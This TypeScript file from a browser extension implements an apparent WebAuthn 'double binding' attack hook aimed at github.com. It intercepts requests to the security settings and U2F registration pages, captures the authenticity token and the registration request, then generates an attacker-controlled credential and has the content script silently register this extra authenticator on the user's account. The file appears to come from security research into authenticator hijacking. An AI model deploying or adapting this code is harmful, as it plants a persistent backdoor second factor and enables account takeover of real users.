import { fromByteArray, toByteArray } from '../../lib/base64url.js';
// import { getOriginFromUrl, parseWebauthnCreateResponse, prepareWebauthnCreateRequest } from "../../utils";
import { DoubleBindingImplementation } from "./double_binding_implementation";
import { getLogger } from '../../logging';


// import { AttackHook } from '../../attacks/attack_hook';
import { disabledIcons, enabledIcons } from '../../constants';
import { getOriginFromUrl, webauthnParse, webauthnStringify, parseWebauthnCreateResponse, prepareWebauthnCreateRequest } from '../../utils';
import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../../webauthn';


const log = getLogger('background');

const ID_SUFFIX = 'DD';

class RegisterRequestDetails {
    formData;

    constructor(formData) {
        this.formData = formData;
    }
}

export class DoubleBindingImplementationGithub extends DoubleBindingImplementation {
    static MATCH_DOMAIN = 'github.com';

    registerRequest = "";
    registerAuthenticityToken = "";

    onNetwork(details: chrome.webRequest.WebRequestBodyDetails) {
        const url = new URL(details.url);
        // console.log(url);
        if (url.pathname === '/settings/security') {
            console.log("FOUnd reqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
            // console.log(details)

            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
              const activeTab = tabs[0];
              chrome.tabs.sendMessage(activeTab.id, { 'message': 'getGithubWebAuthnReq' }, (response) => {
                // Handle the response from the content script
                console.log("In git hook");
                console.log(response);
                this.registerRequest=response;
              });
            });

        }
        // if(url.pathname === '/api/v1/register') {
        //     this.registerRequests.push(new RegisterRequestDetails(details.requestBody.formData));
        // }

        if(url.pathname === '/u2f/registrations' && this.registerAuthenticityToken === '') {
            console.log("FOUnd rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr");
            console.log(details)
            const formData = details.requestBody.formData;
            // Retrieve the desired value from the FormData
            this.registerAuthenticityToken = details.requestBody.formData["authenticity_token"][0];
            // this.registerAuthenticityToken = details.registerAuthenticityToken;
        }
    }

    
    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender, createdCredential: any) {
        console.log("attack_hook_double_bind_github onCredentialCreate");
        console.log(this.registerRequest)
        // const origin = getOriginFromUrl(sender.url);
        // const originalCredential = webauthnParse(msg.originalCredential);

        const base_id = "AnIB9pkhUNufJjJTZlqDR8GRnb5da3EyPhpjKziRD-kko5s6UApVD8XhslDULfRXlBtvDocwbPCHoEo2wzBSww";
       
        // Generate a random index within the length of the string
        const randomIndex = Math.floor(Math.random() * base_id.length);
        // Get the character at the random index
        const originalCharacter = base_id.charAt(randomIndex);

        // Generate a random replacement character different from the original
        let replacementCharacter;
        do {
          replacementCharacter = String.fromCharCode(Math.floor(Math.random() * 256));
        } while (replacementCharacter === originalCharacter); // Ensure the replacement is different from the original

        // Replace the character at the random index with the replacement character
        const id = base_id.slice(0, randomIndex) + replacementCharacter + base_id.slice(randomIndex + 1);
        // Create a TextEncoder instance
        const textEncoder = new TextEncoder();

        const rawId = textEncoder.encode(id) //Array.from(new Uint8Array(id));

        

        try {
            const opts = webauthnParse(this.registerRequest);
            log.debug(msg);
            const credential = await generateRegistrationKeyAndAttestation(
                "github.com",
                opts.publicKey,
                '9999',
                id,
                rawId
            );

            log.debug('create credential');
            log.debug(credential);
            log.debug(webauthnStringify(credential));
            log.debug('RE PARSE ', webauthnParse(webauthnStringify(credential)));
            
            // const to_send = {
            //     response: prepareWebauthnCreateRequest(credential),
            //     authenticty_token: this.registerAuthenticityToken,
            //     nickname: "test"
            // }



            // for (const key in to_send) {
            //   if (to_send.hasOwnProperty(key)) {
            //     formData.append(key, to_send[key]);
            //   }
            // }

            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
              const activeTab = tabs[0];
              chrome.tabs.sendMessage(activeTab.id, {'message': 'registerDummyAuth', 'resp':webauthnStringify(prepareWebauthnCreateRequest(credential)) });
              // chrome.tabs.sendMessage(activeTab.id, { 'message': 'registerDummyAuth', 'formData': formData }, (response) => {
              //   // Handle the response from the content script
              //   this.registerRequest=response;
              // });
            });


           
            // return {
            //     credential: webauthnStringify(credential),
            //     requestID: msg.requestID,
            //     type: 'create_response',
            // };
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                log.error('failed to import key due to DOMException', { code, message, name }, e);
            } else {
                log.error('failed to import key', { errorType: `${(typeof e)}` }, e);
            }

            // return {
            //     requestID: msg.requestID,
            //     type: 'error',
            //     exception: e.toString()
            // };
        }

    }


    //     const lastRegisterRequest = this.registerRequests.pop();

    //     let baseUrl = new URL(sender.url);
    //     baseUrl.pathname = '';
        
    //     // Start the authentication flow
    //     let startURL = new URL(baseUrl.toString());
    //     startURL.pathname = '/api/v1/register';

    //     let startParams = new URLSearchParams();
    //     for(const [k, v] of Object.entries(lastRegisterRequest.formData)) {
    //         startParams.append(k, `${v}`);
    //     }

    //     const startResponse = await fetch(startURL.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: startParams.toString() });
    //     const startResponseJSON = await startResponse.json();

    //     const requestId = startResponseJSON.request.requestId;
    //     const sessionToken = startResponseJSON.request.sessionToken;
    //     const creationOptions = parseWebauthnCreateResponse(startResponseJSON.request.publicKeyCredentialCreationOptions);

        

    //     // Create the credential
    //     const origin = getOriginFromUrl(sender.url);

    //     const id = createdCredential.id + ID_SUFFIX;
    //     const rawId = Array.from(toByteArray(id));
    //     const credential = await generateRegistrationKeyAndAttestation(
    //         origin,
    //         creationOptions,
    //         '9999',
    //         id,
    //         rawId,
    //     );

    //     const to_send = {
    //         credential: prepareWebauthnCreateRequest(credential),
    //         requestId,
    //         sessionToken
    //     }

    //     // Send the credential
    //     const result = await fetch(startResponseJSON.actions.finish, {
    //         method: 'POST',
    //         body: JSON.stringify(to_send),
    //         headers: { 'Content-Type': 'application/json' }
    //     });
    // }    
}